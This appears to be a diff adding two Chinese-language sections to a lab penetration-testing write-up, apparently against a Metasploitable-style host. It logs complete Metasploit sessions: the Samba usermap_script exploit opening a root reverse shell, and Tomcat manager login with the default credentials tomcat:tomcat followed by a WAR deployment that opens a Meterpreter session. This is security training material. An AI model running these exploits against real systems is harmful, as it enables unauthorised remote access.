@@ -152,9 +152,174 @@ Task Completed
 
 
 
+### 方法一：SMB
+
+msf对SMB服务进行攻击。
+
+```
+msf6 > search samba
+
+Matching Modules
+================
+
+   #   Name                                                 Disclosure Date  Rank       Check  Description
+   -   ----                                                 ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   1   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
+   2   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   3   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   4   post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations
+   5   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules
+   6   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   7   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
+   9   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   11  auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal
+   12  auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   13  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   14  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   15  auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow
+   16  auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow
+   17  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   18  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   19  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   20  auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow
+   21  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
+   22  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
+   23  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
+   24  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
+   25  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
 
 
-### 第一步
+Interact with a module by name or index. For example info 25, use 25 or use exploit/windows/http/sambar6_search_results
+
+msf6 > use 8
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.76.151
+rhosts => 192.168.76.151
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP handler on 192.168.76.150:4444 
+[*] Command shell session 1 opened (192.168.76.150:4444 -> 192.168.76.151:47002) at 2023-09-07 20:45:36 -0400
+
+whoami
+root
+```
+
+
+
+
+
+### 方法三：tomcat
+
+打开默认管理页面：http://192.168.76.151:8180/manager/html
+
+使用弱口令tomcat:tomcat登录。
+
+
+
+```
+msf6 > exploit/multi/http/tomcat_mgr_deploy
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show options 
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.76.150   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set rhosts 192.168.76.151
+rhosts => 192.168.76.151
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
+rport => 8180
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set httppassword tomcat
+httppassword => tomcat
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set httpusername tomcat
+httpusername => tomcat
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword  tomcat           no        The password for the specified username
+   HttpUsername  tomcat           no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.76.151   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         8180             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.76.150   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
+
+[*] Started reverse TCP handler on 192.168.76.150:4444 
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6215 bytes as cPjs.war ...
+[*] Executing /cPjs/Am4YL0em6zTSnvxgojz0DR3XZKh.jsp...
+[*] Undeploying cPjs ...
+[*] Sending stage (58829 bytes) to 192.168.76.151
+[*] Meterpreter session 1 opened (192.168.76.150:4444 -> 192.168.76.151:57385) at 2023-09-07 21:40:55 -0400
+
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > getuid
+Server username: tomcat55
+```
+
+
+
+
+
+### 其他方法
 
 打开扫描到的目录
 
